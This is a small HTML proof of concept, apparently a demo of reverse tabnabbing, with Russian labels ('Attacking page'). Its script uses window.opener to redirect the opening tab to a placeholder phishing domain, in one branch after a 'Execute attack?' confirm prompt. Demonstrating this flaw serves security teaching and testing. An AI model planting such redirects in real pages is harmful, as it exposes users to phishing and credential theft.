<!DOCTYPE html>
<html>
<script>
    setTimeout(() => {
        if (window.opener) {
            // Меняем URL opener
            window.opener.location.href = 'https://evil-phishing-site.example.com';
            
            // Или показываем подтверждение
            const confirmed = confirm('Выполнить атаку?');
            if (confirmed) {
                window.opener.location.href = 'https://evil-phishing-site.example.com';
            }
        }
    }, 1000);
</script>
<body>
    <h2>Атакующая страница</h2>
    <p>Эта страница пытается изменить исходную вкладку.</p>
</body>
</html>
